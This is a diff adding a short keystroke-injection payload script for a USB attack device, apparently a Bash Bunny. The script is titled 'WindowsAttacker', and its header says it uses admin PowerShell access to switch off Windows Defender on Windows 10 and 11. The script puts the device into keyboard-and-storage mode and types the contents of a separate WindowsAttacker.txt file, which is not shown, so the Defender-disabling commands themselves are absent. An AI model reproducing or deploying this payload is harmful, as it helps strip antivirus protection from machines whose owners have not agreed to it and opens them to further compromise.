@@ -1,0 +1,21 @@
+# Title: WindowsAttacker 
+# Author: White_Wid0w
+# Version: 1.0
+# Category: Executable
+# Target: Windows 10, 11
+# Description: A payload that uses admin access on powerrshell to turn off windows defender. 
+
+
+LED SETUP 
+
+GET SWITCH_POSITION   
+
+ATTACKMODE HID STORAGE
+
+LED STAGE2 
+
+QUACK DELAY 3000
+LED STAGE2
+QUACK ${SWITCH_POSITION}/WindowsAttacker.txt 
+
+LED FINISH 
